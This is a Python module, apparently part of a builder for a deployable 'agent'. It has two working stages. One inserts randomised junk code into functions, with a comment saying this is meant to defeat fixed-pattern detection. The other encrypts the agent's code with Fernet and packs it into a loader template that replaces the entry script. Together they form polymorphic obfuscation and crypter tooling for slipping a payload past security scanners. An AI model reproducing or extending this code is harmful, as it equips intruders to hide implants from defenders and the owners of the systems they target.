# strategies/mutation.py

import ast
import random
import string
import base64
from rich.console import Console
from cryptography.fernet import Fernet
from .base import BuildContext, ObfuscationStrategy, MutationStrategy

console = Console()


class JunkCodeTransformer(ast.NodeTransformer):
    """
    Visita cada função no código e insere um bloco de código lixo
    em posição aleatória dentro do corpo da função.
    """

    def _generate_junk_block(self) -> list:
        nodes = []
        var1_name = '_junk_' + ''.join(random.choices(string.ascii_lowercase, k=8))
        var2_name = '_junk_' + ''.join(random.choices(string.ascii_lowercase, k=8))

        initial_value = random.randint(10000, 99999)
        multiplier = random.randint(2, 10)
        subtractor = random.randint(1000, 5000)

        op_choices = [
            (ast.Mult, ast.Add),
            (ast.Add, ast.Sub),
            (ast.Div, ast.Mult),
            (ast.Sub, ast.Div)
        ]
        op1, op2 = random.choice(op_choices)

        nodes.append(ast.Assign(
            targets=[ast.Name(id=var1_name, ctx=ast.Store())],
            value=ast.Constant(value=initial_value)
        ))
        nodes.append(ast.Assign(
            targets=[ast.Name(id=var2_name, ctx=ast.Store())],
            value=ast.BinOp(
                left=ast.Name(id=var1_name, ctx=ast.Load()),
                op=op1(),
                right=ast.Constant(value=multiplier)
            )
        ))
        nodes.append(ast.Assign(
            targets=[ast.Name(id=var1_name, ctx=ast.Store())],
            value=ast.BinOp(
                left=ast.Name(id=var2_name, ctx=ast.Load()),
                op=op2(),
                right=ast.Constant(value=subtractor)
            )
        ))
        return nodes

    def _visit_func(self, node):
        """Lógica compartilhada para FunctionDef e AsyncFunctionDef."""
        if len(node.body) < 2 or node.name.startswith('__'):
            return node

        junk_block = self._generate_junk_block()

        # Insere em posição aleatória para derrotar detecção por padrão fixo
        max_pos = max(1, len(node.body) - 1)
        insert_pos = random.randint(0, max_pos)

        for junk_node in reversed(junk_block):
            node.body.insert(insert_pos, junk_node)

        ast.fix_missing_locations(node)
        return node

    def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:
        return self._visit_func(node)

    # Cobertura para async def
    visit_AsyncFunctionDef = visit_FunctionDef


class JunkCodeInsertionStrategy(MutationStrategy):
    """Aplica mutações polimórficas inserindo código lixo nas funções."""

    def execute(self, context: BuildContext) -> BuildContext:
        source_code = context.entry_script_path.read_text(encoding="utf-8")
        tree = ast.parse(source_code)

        transformer = JunkCodeTransformer()
        mutated_tree = transformer.visit(tree)

        # Conta funções modificadas
        func_count = sum(
            1 for n in ast.walk(mutated_tree)
            if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
            and not n.name.startswith('__')
            and len(n.body) >= 2
        )

        context.entry_script_path.write_text(
            ast.unparse(mutated_tree), encoding="utf-8"
        )

        context.log(f"JunkCodeInsertion: código lixo inserido em {func_count} funções.")
        console.print(f"[bold cyan]  → Junk code inserido em {func_count} funções (posição aleatória).[/bold cyan]")
        return context


class LoaderPackingStrategy(MutationStrategy):
    """
    Empacota o payload do agente dentro de um loader criptografado com Fernet.
    Deve ocorrer após todas as modificações no código do agente e antes da compilação.
    """

    def execute(self, context: BuildContext) -> BuildContext:
        console.print("[bold yellow]  → Iniciando empacotamento com loader criptografado...[/bold yellow]")

        loader_template_path = context.base_dir / 'strategies' / 'loader_template.py'
        if not loader_template_path.exists():
            raise FileNotFoundError(
                f"Template do loader não encontrado em: {loader_template_path}"
            )

        console.print(f"[bold cyan]  → Lendo agente de: {context.entry_script_path.name}[/bold cyan]")
        agent_code = context.entry_script_path.read_text(encoding='utf-8')

        console.print("[bold cyan]  → Gerando chave Fernet e criptografando payload...[/bold cyan]")
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted_payload = cipher.encrypt(agent_code.encode('utf-8'))

        key_b64 = base64.b64encode(key).decode('utf-8')
        payload_b64 = base64.b64encode(encrypted_payload).decode('utf-8')

        console.print("[bold cyan]  → Injetando payload no template do loader...[/bold cyan]")
        loader_code = loader_template_path.read_text(encoding='utf-8')

        if '%%ENCRYPTED_PAYLOAD%%' not in loader_code or '%%DECRYPTION_KEY%%' not in loader_code:
            raise ValueError(
                "loader_template.py corrompido — placeholders %%ENCRYPTED_PAYLOAD%% "
                "ou %%DECRYPTION_KEY%% não encontrados."
            )

        loader_code = loader_code.replace("%%ENCRYPTED_PAYLOAD%%", payload_b64)
        loader_code = loader_code.replace("%%DECRYPTION_KEY%%", key_b64)

        context.entry_script_path.write_text(loader_code, encoding='utf-8')

        context.log("LoaderPacking: payload criptografado e empacotado no loader.")
        console.print("[bold green]  → Loader pronto. Script de entrada substituído com sucesso.[/bold green]")
        return context
